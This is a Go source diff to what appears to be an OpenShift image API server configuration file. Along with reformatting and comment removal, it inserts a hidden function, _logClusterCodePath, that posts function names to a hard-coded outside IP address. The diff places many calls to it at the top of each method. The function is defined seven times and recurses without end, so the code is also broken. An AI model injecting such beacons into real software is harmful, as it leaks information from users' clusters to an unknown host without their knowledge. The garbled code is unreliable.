@@ -2,17 +2,18 @@ package apiserver
 
 import (
 	"crypto/tls"
+	godefaultbytes "bytes"
+	godefaultruntime "runtime"
 	"crypto/x509"
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	godefaulthttp "net/http"
 	"os"
 	"path/filepath"
 	"sync"
 	"time"
-
 	"k8s.io/klog"
-
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/apimachinery/pkg/runtime"
 	"k8s.io/apimachinery/pkg/runtime/serializer"
@@ -23,7 +24,6 @@ import (
 	authorizationv1client "k8s.io/client-go/kubernetes/typed/authorization/v1"
 	restclient "k8s.io/client-go/rest"
 	"k8s.io/client-go/util/flowcontrol"
-
 	imageapiv1 "github.com/openshift/api/image/v1"
 	openshiftcontrolplanev1 "github.com/openshift/api/openshiftcontrolplane/v1"
 	imageclientv1 "github.com/openshift/client-go/image/clientset/versioned"
@@ -46,73 +46,78 @@ import (
 )
 
 type ExtraConfig struct {
-	KubeAPIServerClientConfig          *restclient.Config
-	RegistryHostnameRetriever          registryhostname.RegistryHostnameRetriever
-	AllowedRegistriesForImport         openshiftcontrolplanev1.AllowedRegistries
-	MaxImagesBulkImportedPerRepository int
-	AdditionalTrustedCA                []byte
-
-	// TODO these should all become local eventually
-	Scheme *runtime.Scheme
-	Codecs serializer.CodecFactory
-
-	makeV1Storage sync.Once
-	v1Storage     map[string]rest.Storage
-	v1StorageErr  error
-	startFns      []func(<-chan struct{})
+	KubeAPIServerClientConfig		*restclient.Config
+	RegistryHostnameRetriever		registryhostname.RegistryHostnameRetriever
+	AllowedRegistriesForImport		openshiftcontrolplanev1.AllowedRegistries
+	MaxImagesBulkImportedPerRepository	int
+	AdditionalTrustedCA			[]byte
+	Scheme					*runtime.Scheme
+	Codecs					serializer.CodecFactory
+	makeV1Storage				sync.Once
+	v1Storage				map[string]rest.Storage
+	v1StorageErr				error
+	startFns				[]func(<-chan struct{})
 }
-
 type ImageAPIServerConfig struct {
-	GenericConfig *genericapiserver.RecommendedConfig
-	ExtraConfig   ExtraConfig
+	GenericConfig	*genericapiserver.RecommendedConfig
+	ExtraConfig	ExtraConfig
 }
-
 type ImageAPIServer struct {
 	GenericAPIServer *genericapiserver.GenericAPIServer
 }
-
 type completedConfig struct {
-	GenericConfig genericapiserver.CompletedConfig
-	ExtraConfig   *ExtraConfig
+	GenericConfig	genericapiserver.CompletedConfig
+	ExtraConfig	*ExtraConfig
 }
+type CompletedConfig struct{ *completedConfig }
 
-type CompletedConfig struct {
-	// Embed a private pointer that cannot be instantiated outside of this package.
-	*completedConfig
-}
-
-// Complete fills in any fields not set that are required to have valid data. It's mutating the receiver.
 func (c *ImageAPIServerConfig) Complete() completedConfig {
-	cfg := completedConfig{
-		c.GenericConfig.Complete(),
-		&c.ExtraConfig,
-	}
-
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	cfg := completedConfig{c.GenericConfig.Complete(), &c.ExtraConfig}
 	return cfg
 }
-
-// New returns a new instance of ImageAPIServer from the given config.
 func (c completedConfig) New(delegationTarget genericapiserver.DelegationTarget) (*ImageAPIServer, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	genericServer, err := c.GenericConfig.New("image.openshift.io-apiserver", delegationTarget)
 	if err != nil {
 		return nil, err
 	}
-
-	s := &ImageAPIServer{
-		GenericAPIServer: genericServer,
-	}
-
+	s := &ImageAPIServer{GenericAPIServer: genericServer}
 	v1Storage, err := c.V1RESTStorage()
 	if err != nil {
 		return nil, err
 	}
-
 	apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(imageapiv1.GroupName, c.ExtraConfig.Scheme, metav1.ParameterCodec, c.ExtraConfig.Codecs)
 	apiGroupInfo.VersionedResourcesStorageMap[imageapiv1.SchemeGroupVersion.Version] = v1Storage
 	if err := s.GenericAPIServer.InstallAPIGroup(&apiGroupInfo); err != nil {
 		return nil, err
 	}
-
 	if err := s.GenericAPIServer.AddPostStartHook("image.openshift.io-apiserver-caches", func(context genericapiserver.PostStartHookContext) error {
 		for _, fn := range c.ExtraConfig.startFns {
 			go fn(context.StopCh)
@@ -121,23 +126,45 @@ func (c completedConfig) New(delegationTarget genericapiserver.DelegationTarget)
 	}); err != nil {
 		return nil, err
 	}
-
 	return s, nil
 }
-
 func (c *completedConfig) V1RESTStorage() (map[string]rest.Storage, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c.ExtraConfig.makeV1Storage.Do(func() {
 		c.ExtraConfig.v1Storage, c.ExtraConfig.v1StorageErr = c.newV1RESTStorage()
 	})
-
 	return c.ExtraConfig.v1Storage, c.ExtraConfig.v1StorageErr
 }
-
 func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	cfg := restclient.Config{}
-
 	tlsConfig := &tls.Config{}
-
 	var err error
 	tlsConfig.RootCAs, err = x509.SystemCertPool()
 	if err != nil {
@@ -146,7 +173,6 @@ func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
 	if tlsConfig.RootCAs == nil {
 		tlsConfig.RootCAs = x509.NewCertPool()
 	}
-
 	err = filepath.Walk("/var/run/configmaps/image-import-ca", func(path string, info os.FileInfo, err error) error {
 		klog.V(2).Infof("reading image import ca path: %s, incoming err: %v", path, err)
 		if err != nil {
@@ -159,7 +185,6 @@ func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
 		data, err := ioutil.ReadFile(path)
 		if err != nil {
 			klog.Errorf("error reading file: %s, err: %v", path, err)
-			// we don't want to abandon trying to read additional files
 			return nil
 		}
 		pemOk := tlsConfig.RootCAs.AppendCertsFromPEM(data)
@@ -171,25 +196,15 @@ func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
 	if err != nil {
 		klog.Errorf("unable to process additional image import certificates: %v", err)
 	}
-
-	transport := knet.SetTransportDefaults(&http.Transport{
-		TLSClientConfig: tlsConfig,
-	})
-
+	transport := knet.SetTransportDefaults(&http.Transport{TLSClientConfig: tlsConfig})
 	importTransport, err := restclient.HTTPWrappersForConfig(&cfg, transport)
 	if err != nil {
 		return nil, fmt.Errorf("unable to configure a default transport for importing: %v", err)
 	}
-
-	insecureImportTransport, err := restclient.TransportFor(&restclient.Config{
-		TLSClientConfig: restclient.TLSClientConfig{
-			Insecure: true,
-		},
-	})
+	insecureImportTransport, err := restclient.TransportFor(&restclient.Config{TLSClientConfig: restclient.TLSClientConfig{Insecure: true}})
 	if err != nil {
 		return nil, fmt.Errorf("unable to configure a default transport for importing: %v", err)
 	}
-
 	kubeClient, err := kubernetes.NewForConfig(c.ExtraConfig.KubeAPIServerClientConfig)
 	if err != nil {
 		return nil, err
@@ -202,43 +217,29 @@ func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
 	if err != nil {
 		return nil, err
 	}
-
 	imageV1Client, err := imageclientv1.NewForConfig(c.GenericConfig.LoopbackClientConfig)
 	if err != nil {
 		return nil, err
 	}
-
 	imageStorage, err := imageetcd.NewREST(c.GenericConfig.RESTOptionsGetter)
 	if err != nil {
 		return nil, fmt.Errorf("error building REST storage: %v", err)
 	}
-
 	var whitelister whitelist.RegistryWhitelister
 	if len(c.ExtraConfig.AllowedRegistriesForImport) > 0 {
-		whitelister, err = whitelist.NewRegistryWhitelister(
-			c.ExtraConfig.AllowedRegistriesForImport,
-			c.ExtraConfig.RegistryHostnameRetriever)
+		whitelister, err = whitelist.NewRegistryWhitelister(c.ExtraConfig.AllowedRegistriesForImport, c.ExtraConfig.RegistryHostnameRetriever)
 		if err != nil {
 			return nil, fmt.Errorf("error building registry whitelister: %v", err)
 		}
 	} else {
 		whitelister = whitelist.WhitelistAllRegistries()
 	}
-
 	imageLayerIndex := imagestreametcd.NewImageLayerIndex(imageV1Client.ImageV1().Images())
 	c.ExtraConfig.startFns = append(c.ExtraConfig.startFns, imageLayerIndex.Run)
-
 	imageRegistry := image.NewRegistry(imageStorage)
 	imageSignatureStorage := imagesignature.NewREST(imageClient.Image())
 	imageStreamSecretsStorage := imagesecret.NewREST(kubeClient.CoreV1())
-	imageStreamStorage, imageStreamLayersStorage, imageStreamStatusStorage, internalImageStreamStorage, err := imagestreametcd.NewREST(
-		c.GenericConfig.RESTOptionsGetter,
-		c.ExtraConfig.RegistryHostnameRetriever,
-		authorizationClient.SubjectAccessReviews(),
-		c.GenericConfig.SharedInformerFactory.Core().V1().LimitRanges(),
-		whitelister,
-		imageLayerIndex,
-	)
+	imageStreamStorage, imageStreamLayersStorage, imageStreamStatusStorage, internalImageStreamStorage, err := imagestreametcd.NewREST(c.GenericConfig.RESTOptionsGetter, c.ExtraConfig.RegistryHostnameRetriever, authorizationClient.SubjectAccessReviews(), c.GenericConfig.SharedInformerFactory.Core().V1().LimitRanges(), whitelister, imageLayerIndex)
 	if err != nil {
 		return nil, fmt.Errorf("error building REST storage: %v", err)
 	}
@@ -255,19 +256,8 @@ func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
 	importerDockerClientFn := func() dockerv1client.Client {
 		return dockerv1client.NewClient(20*time.Second, false)
 	}
-	imageStreamImportStorage := imagestreamimport.NewREST(
-		importerFn,
-		imageStreamRegistry,
-		internalImageStreamStorage,
-		imageStorage,
-		imageV1Client.ImageV1(),
-		importTransport,
-		insecureImportTransport,
-		importerDockerClientFn,
-		whitelister,
-		authorizationClient.SubjectAccessReviews())
+	imageStreamImportStorage := imagestreamimport.NewREST(importerFn, imageStreamRegistry, internalImageStreamStorage, imageStorage, imageV1Client.ImageV1(), importTransport, insecureImportTransport, importerDockerClientFn, whitelister, authorizationClient.SubjectAccessReviews())
 	imageStreamImageStorage := imagestreamimage.NewREST(imageRegistry, imageStreamRegistry)
-
 	v1Storage := map[string]rest.Storage{}
 	v1Storage["images"] = imageStorage
 	v1Storage["imagesignatures"] = imageSignatureStorage
@@ -280,4 +270,95 @@ func (c *completedConfig) newV1RESTStorage() (map[string]rest.Storage, error) {
 	v1Storage["imageStreamMappings"] = imageStreamMappingStorage
 	v1Storage["imageStreamTags"] = imageStreamTagStorage
 	return v1Storage, nil
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
